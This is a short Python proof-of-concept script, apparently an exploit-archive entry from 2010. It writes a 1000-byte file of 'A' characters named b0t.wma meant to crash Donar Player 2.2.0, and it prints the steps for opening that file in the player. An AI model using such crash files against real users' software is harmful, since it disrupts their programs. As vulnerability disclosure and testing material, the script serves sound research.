@@ -1,0 +1,20 @@
+#!/usr/bin/python
+#
+# Title: Donar Player 2.2.0 Local Crash PoC
+# Date: 03-21-2010
+# Author: b0telh0
+# Link: http://www.donarzone.com/downloads/donar-player-setup-free.exe
+# Tested on: Windows XP SP3
+
+
+crash = "\x41" * 1000
+
+try:
+     file = open('b0t.wma','w');
+     file.write(crash);
+     file.close();
+     print "\n[+] b0t.wma created."
+     print "[+] File > Music Library > Add Files..."
+     print "[+] Open b0t.wma and play it.\n"
+except:
+     print "\n[-] Error.. Can't write file to system.\n"
